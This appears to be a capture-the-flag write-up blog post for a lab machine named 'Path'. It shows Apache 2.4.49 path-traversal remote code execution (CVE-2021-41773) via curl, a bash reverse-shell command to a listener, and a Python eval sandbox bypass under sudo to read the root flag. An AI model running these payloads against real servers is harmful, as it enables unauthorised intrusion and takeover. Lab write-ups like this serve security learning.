---
layout: post
author: maxin
title:  "Path"
date:   2022-03-15 02:21:10 PM -03
category: CrowSec
tags: Writeup
---

# Enumeration

## Nmap

{% highlight text %}
Nmap scan report for 10.9.2.20
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 31:28:28:0d:21:c3:02:13:61:6a:31:cb:17:97:36:64 (RSA)
|   256 1c:00:ec:12:ae:ce:cc:0c:95:a7:b3:fc:20:08:a8:44 (ECDSA)
|_  256 68:04:d8:ef:52:11:e8:a7:98:e4:d5:8f:36:b2:e2:df (ED25519)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Data web
| http-methods:
|_  Supported Methods: POST OPTIONS HEAD GET
|_http-server-header: Apache/2.4.29 (Ubuntu)
8080/tcp open  http    Apache httpd 2.4.49 ((Unix))
| http-methods:
|   Supported Methods: OPTIONS HEAD GET POST TRACE
|_  Potentially risky methods: TRACE
|_http-title: Site doesn't have a title (text/html).
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Apache/2.4.49 (Unix)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
{% endhighlight %}

The machine has two apache and one of them has a vulnerable version `2.4.49`

## Fuzzing port 8080

This vulnerable depends of cgi-bin folder, let’s fuzzing to see if this machine has this folder

{% highlight bash %}
ffuf -u http://10.9.2.20:8080/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt
{% endhighlight %}

{% highlight text %}
cgi-bin/                [Status: 403, Size: 199, Words: 14, Lines: 8]
index.html              [Status: 200, Size: 45, Words: 2, Lines: 2]
{% endhighlight %}

Yes, the machine has the folder.

### Exploit

[CVE-2021-41773](https://github.com/jbovet/CVE-2021-41773)

{% highlight bash %}
curl --data "echo;id" 'http://10.9.2.20:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh' 
{% endhighlight %}

Reverse shell

- Open a listener port and create a reverse shell

{% highlight bash %}
curl --data "echo;bash -c 'bash -i >& /dev/tcp/<IP>/4444 0>&1'" 'http://10.9.2.20:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh'
{% endhighlight %}

## Root

{% highlight text %}
sudo -l

User daemon may run the following commands on 203dc28a76f7:
    (ALL) NOPASSWD: /usr/bin/python3 /opt/script.py
{% endhighlight %}

{% highlight python %}
import ssl

print('''
  ______                   _____
  / ____/________ _      __/ ___/___  _____
 / /   / ___/ __ \ | /| / /\__ \/ _ \/ ___/
/ /___/ /  / /_/ / |/ |/ /___/ /  __/ /__
\____/_/   \____/|__/|__//____/\___/\___/

''')
print('\n')

crowsec = "SuperSecretKey"

cmd = str(input("[CMD]>"))

if(cmd[0:7] != "crowsec"): -> We need to start the command with this word
    print("[X] Invalid prefix!")
    exit(1)
else:
    while True:
        cmd.replace("__import__","")
        cmd.replace("|","") -> Thisis BAD, we can bypass this using pipe with space. "| " like this
        cmd.replace("system","")
        try:
            result = eval(cmd)
        except:
            result = "ERROR"
        print(result)
        cmd = str(input("[CMD]>"))
        if(cmd[0:7] != "crowsec"):
            print("[X] Invalid prefix!")
            break
{% endhighlight %}

[Bypass Python sandboxes](https://book.hacktricks.xyz/misc/basic-python/bypass-python-sandboxes)

{% highlight bash %}
sudo python3 /opt/script.py
crowsec| print(open("/root/root.txt").read())
{% endhighlight %}